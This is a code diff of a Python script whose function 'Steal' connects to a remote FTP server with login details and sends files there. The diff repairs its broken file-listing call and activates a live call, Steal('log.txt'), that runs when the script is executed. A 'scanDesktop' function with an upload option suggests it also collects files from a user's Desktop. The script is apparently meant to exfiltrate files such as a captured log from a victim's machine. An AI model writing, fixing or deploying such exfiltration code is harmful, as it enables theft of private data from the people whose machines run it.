@@ -4,13 +4,13 @@ import os
 
 
 def Steal(filename):
-    ip = '172.23.7.161' # insert ip address
-    port = 2002
-    username = '----------------' # insert username
-    password = '-----------------' # insert password
+    ip = '--------------' # insert ip address
+    port = 22
+    username = '-----------' # insert username
+    password = '-----------' # insert password
 
     ftp = ftplib.FTP() # annouce FTP object
-    ftp.connect(ip, port)
+    ftp.connect(ip)
     ftp.login(username, password)
 
 
@@ -18,7 +18,7 @@ def Steal(filename):
     mypath = '/home/dimon/Documents/' # insert path from server
     ftp.cwd(mypath) # change working directory
 
-    files = ftp.nlist() # list all the files in folder
+    files = ftp.nlst() # list all the files in folder
     print('BEFORE: ', files)
 
 
@@ -31,12 +31,12 @@ def Steal(filename):
     print(result)
 
 
-    files = ftp.nlist() # list all the files in folder
+    files = ftp.nlst() # list all the files in folder
     print('AFTER: ', files)
     ftp.close()
 
 
-# Steal('test.txt')
+Steal('log.txt')
 
 
 def scanDesktop(path='Desktop', upload=False):
